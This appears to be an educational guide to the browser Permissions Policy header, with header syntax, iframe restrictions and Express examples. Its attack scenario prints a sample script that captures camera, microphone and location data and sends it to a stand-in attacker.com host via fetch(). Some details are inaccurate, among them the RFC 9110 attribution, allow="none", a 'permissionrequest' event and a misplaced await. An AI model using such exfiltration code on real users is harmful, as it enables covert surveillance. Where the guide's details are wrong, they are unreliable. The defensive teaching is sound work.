# Permissions Policy (Feature Policy)

## Definition

**Permissions Policy** (formerly known as Feature Policy) is a security mechanism that allows web servers to selectively enable, disable, and modify the behavior of certain browser APIs and features. It provides fine-grained control over which browser features can be used in a document and what origins are allowed to use them. This is particularly important for controlling access to sensitive hardware features and APIs like camera, microphone, geolocation, payment methods, and USB devices.

## How Permissions Policy Works

Permissions Policy controls browser APIs at three levels:

1. **Top-level document**: Controls what features the main page can use
2. **Same-origin iframes**: Controls what nested frames can access
3. **Cross-origin iframes**: Controls what third-party content can access

The policy is enforced by the browser through HTTP headers or HTML meta tags, preventing JavaScript from accessing restricted APIs even if the page tries to call them.

### Browser APIs Controlled by Permissions Policy

**Sensitive Hardware & Sensors:**
- `camera` - Access to the device camera
- `microphone` - Access to the device microphone
- `accelerometer` - Device acceleration sensors
- `gyroscope` - Device rotation sensors
- `magnetometer` - Device magnetic field sensors
- `geolocation` - Precise GPS location data

**User Interaction:**
- `fullscreen` - Ability to request fullscreen mode
- `picture-in-picture` - Picture-in-picture video capability

**Payment & Identification:**
- `payment` - Payment Request API
- `usb` - WebUSB API access

**Media & Streaming:**
- `microphone` - Audio input
- `camera` - Video input

**Document-level APIs:**
- `document-domain` - Ability to set document.domain

## Permissions-Policy HTTP Header Syntax

The modern syntax (RFC 9110) uses a semicolon-separated list of directives:

```
Permissions-Policy: <directive>=(<allowlist>); <directive>=(<allowlist>)
```

### Allowlist Syntax

```
*            - Allow all origins
self         - Allow same-origin only
none         - Block all origins (including self)
"origin"     - Allow specific origins with quotes
```

### Header Examples

```http
# Disable all features
Permissions-Policy: camera=(), microphone=(), geolocation=()

# Allow camera only for same-origin
Permissions-Policy: camera=(self)

# Allow payment API for self and trusted payment processor
Permissions-Policy: payment=(self "https://payment.example.com")

# Allow fullscreen for all origins
Permissions-Policy: fullscreen=(*)

# Multiple directives
Permissions-Policy:
  geolocation=();
  camera=(self);
  microphone=(self "https://trusted-video-service.com");
  payment=(self "https://payment-provider.com")
```

## The `allow` Attribute on iframes

The `allow` attribute on `<iframe>` elements provides a comma-separated list of permissions to grant to the embedded document:

```html
<!-- Restrict iframe features -->
<iframe
  src="https://third-party.com/embed"
  allow="camera 'none'; microphone 'none'">
</iframe>

<!-- Allow specific features to specific origins -->
<iframe
  src="https://trusted-service.com"
  allow="geolocation 'self' https://trusted-service.com; payment 'self'">
</iframe>

<!-- Allow camera and microphone for video conferencing -->
<iframe
  src="https://video-service.com/meeting"
  allow="camera; microphone">
</iframe>
```

## Why This Matters for Third-Party Content

Third-party scripts and iframes pose significant security risks:

1. **Malicious Access**: Compromised or malicious third-party code can attempt to:
   - Access user's camera/microphone without consent
   - Determine user's geolocation
   - Access payment information
   - Exfiltrate sensitive hardware sensor data

2. **Accidental Exposure**: Well-intentioned third parties may request more permissions than necessary

3. **Supply Chain Attacks**: If a popular analytics or ad network is compromised, it can use these APIs against millions of users

4. **XSS in Third-Party Code**: If third-party code is vulnerable to XSS, attackers gain access to all the permissions granted to that code

### Real-World Example: Camera/Microphone Hijacking

```html
<!-- Vulnerable: gives ads library full access to camera and microphone -->
<script src="https://untrusted-ads.com/banner.js"></script>

<!-- Better: restrict what the script can do via CSP, but still risky -->
<!-- Secure: don't load untrusted third-party scripts at all -->
<!-- If required: load in an iframe with restrictive permissions -->
<iframe
  src="https://ads.com/banner.html"
  allow="none"
  sandbox="allow-scripts allow-same-origin">
</iframe>
```

## Permissions Policy for Single-Page Applications (SPAs)

SPAs typically follow a "deny by default" approach and selectively enable only needed features:

```http
# Secure SPA policy - restrictive by default
Permissions-Policy:
  geolocation=(),
  camera=(),
  microphone=(),
  payment=(),
  usb=(),
  accelerometer=(),
  gyroscope=(),
  magnetometer=(),
  fullscreen=()
```

For SPAs that use specific features:

```http
# Video conferencing SPA
Permissions-Policy:
  camera=(self),
  microphone=(self),
  geolocation=(),
  payment=(),
  usb=()

# Mapping/location SPA
Permissions-Policy:
  geolocation=(self),
  camera=(),
  microphone=(),
  payment=(),
  usb=()

# E-commerce SPA with Payment Request API
Permissions-Policy:
  payment=(self),
  camera=(),
  microphone=(),
  geolocation=()
```

## How the Attack Works: Step-by-Step

### Scenario: Malicious Third-Party Analytics

1. **Website owner** includes analytics script: `<script src="https://untrusted-analytics.com/track.js">`
2. **Script downloads** and contains: `navigator.mediaDevices.getUserMedia({audio: true, video: true})`
3. **Browser prompts** user for camera/microphone access
4. **User grants** permission, unaware that analytics service is requesting it
5. **Malicious script** streams video/audio to attacker's servers
6. **Data exfiltration** occurs silently

## Vulnerable Code Example

```javascript
// ❌ VULNERABLE: index.html
// No permissions policy controls what scripts can do
<!DOCTYPE html>
<html>
<head>
  <title>My Website</title>
  <!-- No Permissions-Policy header set -->
</head>
<body>
  <h1>Welcome</h1>

  <!-- Third-party analytics - unrestricted -->
  <script src="https://analytics-service.com/track.js"></script>

  <!-- Third-party ads - unrestricted -->
  <script src="https://ad-network.com/ads.js"></script>

  <!-- Embedded video - unrestricted -->
  <iframe src="https://video-platform.com/embed?id=123"></iframe>

  <!-- Embedded map widget - unrestricted -->
  <iframe src="https://maps-service.com/widget"></iframe>
</body>
</html>

// ❌ VULNERABLE: server.js (Express)
const express = require('express');
const app = express();

// No security headers are set
app.get('/', (req, res) => {
  res.sendFile('index.html');
});

app.listen(3000);
```

**Attack Scenario with Vulnerable Code:**

```javascript
// File: https://analytics-service.com/track.js
// (Legitimately loaded by website, but compromised or malicious)

// Attempt to access camera without user's knowledge
navigator.mediaDevices.getUserMedia({
  audio: true,
  video: true
}).then(stream => {
  // Send stream to attacker's server
  fetch('https://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify({
      stream: stream,
      userAgent: navigator.userAgent,
      location: await getLocation()
    })
  });
}).catch(err => {
  // Silently fail - user will only see permission prompt
  console.log('Camera access denied');
});

// Attempt to access geolocation
navigator.geolocation.getCurrentPosition(position => {
  // Exfiltrate coordinates
  fetch('https://attacker.com/location', {
    method: 'POST',
    body: JSON.stringify(position.coords)
  });
});

// Attempt to access payment API
const paymentRequest = new PaymentRequest(
  [{supportedMethods: 'basic-card'}],
  {total: {label: 'Total', amount: {currency: 'USD', value: '99.99'}}}
);

paymentRequest.show();
```

## Secure Code Example

```javascript
// ✅ SECURE: server.js (Express with Helmet.js)
const express = require('express');
const helmet = require('helmet');
const app = express();

// Set comprehensive security headers including Permissions Policy
app.use(helmet());

// Set explicit Permissions Policy (can also be in Helmet config)
app.use((req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    // Deny all sensitive features by default
    'camera=(), ' +
    'microphone=(), ' +
    'geolocation=(), ' +
    'payment=(), ' +
    'usb=(), ' +
    'accelerometer=(), ' +
    'gyroscope=(), ' +
    'magnetometer=(), ' +
    'fullscreen=(self)'
  );
  next();
});

app.get('/', (req, res) => {
  res.sendFile('index.html');
});

app.listen(3000);

// ✅ SECURE: index.html
// Restrictive permissions policy with careful iframe embedding
<!DOCTYPE html>
<html>
<head>
  <title>My Website</title>
  <!-- Permissions Policy via meta tag (as fallback) -->
  <meta http-equiv="Permissions-Policy"
    content="camera=(), microphone=(), geolocation=(), payment=()">
</head>
<body>
  <h1>Welcome</h1>

  <!-- Analytics in restricted iframe -->
  <iframe
    src="https://analytics-service.com/track.html"
    allow="none"
    sandbox="allow-scripts allow-same-origin"
    style="display:none;">
  </iframe>

  <!-- Ads in restricted iframe -->
  <div id="ad-placeholder"></div>
  <script>
    // Load ads only if needed, with sandboxing
    const adFrame = document.createElement('iframe');
    adFrame.src = 'https://ad-network.com/ads.html';
    adFrame.allow = 'none'; // Block all permissions
    adFrame.sandbox.add('allow-scripts', 'allow-same-origin');
    adFrame.style.display = 'none';
    document.getElementById('ad-placeholder').appendChild(adFrame);
  </script>

  <!-- Video with restricted permissions -->
  <iframe
    src="https://video-platform.com/embed?id=123"
    allow="fullscreen"
    sandbox="allow-scripts allow-same-origin allow-popups">
  </iframe>

  <!-- Maps with geolocation only if needed -->
  <!-- For this section, we'd only enable geolocation if the map actually uses it -->
  <div id="map-container"></div>
  <script>
    // Only load map if user specifically requests it
    const mapFrame = document.createElement('iframe');
    mapFrame.id = 'maps-widget';
    // Allow geolocation ONLY for this specific origin
    mapFrame.allow = 'geolocation https://maps-service.com';
    mapFrame.src = 'https://maps-service.com/widget';

    // Only embed on user action
    document.getElementById('map-container').addEventListener('click', () => {
      if (!mapFrame.parentNode) {
        document.getElementById('map-container').appendChild(mapFrame);
      }
    });
  </script>
</body>
</html>
```

## Mitigations and Best Practices

### 1. Default Deny Strategy

```http
# Start with everything disabled
Permissions-Policy:
  camera=(),
  microphone=(),
  geolocation=(),
  payment=(),
  usb=(),
  accelerometer=(),
  gyroscope=(),
  magnetometer=(),
  fullscreen=()
```

Then selectively enable only what you need.

### 2. Restrict Third-Party Frames

```html
<!-- Generic third-party embed with maximum restrictions -->
<iframe
  src="https://external-service.com/embed"
  allow="none"
  sandbox="allow-scripts allow-same-origin"
  title="Embedded Content">
</iframe>

<!-- Service that needs specific permission -->
<iframe
  src="https://maps.service.com/embed"
  allow="geolocation https://maps.service.com"
  sandbox="allow-scripts allow-same-origin allow-popups">
</iframe>
```

### 3. Use the Sandbox Attribute

The HTML `sandbox` attribute provides an additional layer of restriction for iframes:

```html
<iframe
  src="https://untrusted.com"
  sandbox="allow-scripts allow-same-origin"
  allow="none">
  <!-- This iframe can only:
       - Execute scripts
       - Make same-origin requests
       - But CANNOT access any browser APIs (camera, microphone, etc.)
       - Cannot open popups
       - Cannot submit forms
       - Cannot navigate top-level frame
  -->
</iframe>
```

### 4. Audit Third-Party Dependencies

```bash
# Check what features third-party scripts are requesting
# This requires manual code review or third-party security audits

npm audit  # Check for known vulnerabilities
npx snyk test  # Test for security issues
```

### 5. Implement in Express with Helmet

```javascript
const express = require('express');
const helmet = require('helmet');
const app = express();

// Helmet provides sensible defaults
app.use(helmet());

// Customize permissions policy
app.use(helmet.featurePolicy({
  directives: {
    camera: ["'none'"],
    microphone: ["'none'"],
    geolocation: ["'self'"],
    payment: ["'self'"],
    fullscreen: ["'self'"]
  }
}));

// Or use the modern Permissions-Policy header
app.use((req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    "camera=(), microphone=(), geolocation=(self), payment=(self), fullscreen=(self)"
  );
  next();
});
```

### 6. Monitor Permission Requests

```javascript
// Log and monitor permission requests
document.addEventListener('permissionrequest', (e) => {
  console.warn(`Permission requested: ${e.permission}`);
  // Could send to logging service for monitoring
});

// Monitor getUserMedia calls
const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
navigator.mediaDevices.getUserMedia = function(...args) {
  console.warn('getUserMedia called', args);
  return originalGetUserMedia.apply(this, args);
};
```

### 7. Security Headers Checklist

```javascript
// Complete security header setup
const express = require('express');
const helmet = require('helmet');

const app = express();

app.use(helmet());

app.use((req, res, next) => {
  // Content Security Policy
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );

  // Permissions Policy (Feature Policy)
  res.setHeader(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=(self)'
  );

  // X-Frame-Options
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');

  // X-Content-Type-Options
  res.setHeader('X-Content-Type-Options', 'nosniff');

  next();
});
```

### 8. Document Your Policy

Maintain documentation of why each permission is granted or denied:

```javascript
/**
 * Permissions Policy Documentation
 *
 * camera: DENIED (not a video conferencing app)
 * microphone: DENIED (not a video conferencing app)
 * geolocation: ALLOWED for self only (used in location features)
 * payment: ALLOWED for self and trusted processor (checkout flow)
 * fullscreen: ALLOWED for self only (video players)
 * usb: DENIED (not needed)
 * accelerometer: DENIED (not needed)
 * gyroscope: DENIED (not needed)
 */
```

### 9. Test Your Policy

```javascript
// Test that features are properly restricted
async function testPermissionsPolicy() {
  try {
    // This should fail if camera is disabled
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    console.error('SECURITY: Camera was allowed when it should be blocked!');
  } catch (err) {
    if (err.name === 'NotAllowedError') {
      console.log('✓ Camera access properly blocked by Permissions Policy');
    }
  }
}

// Run on page load
window.addEventListener('load', testPermissionsPolicy);
```

### 10. Regular Audits

- Review third-party integrations quarterly
- Update permissions as features change
- Monitor for unexpected permission requests
- Keep browser and framework dependencies updated

## Summary

Permissions Policy is a critical security control that prevents unauthorized access to sensitive browser features. By implementing a "default deny" approach and selectively enabling only necessary permissions, you significantly reduce the attack surface when embedding third-party content. Combined with CSP, sandboxing, and regular security audits, Permissions Policy forms a robust defense against malicious third-party scripts.
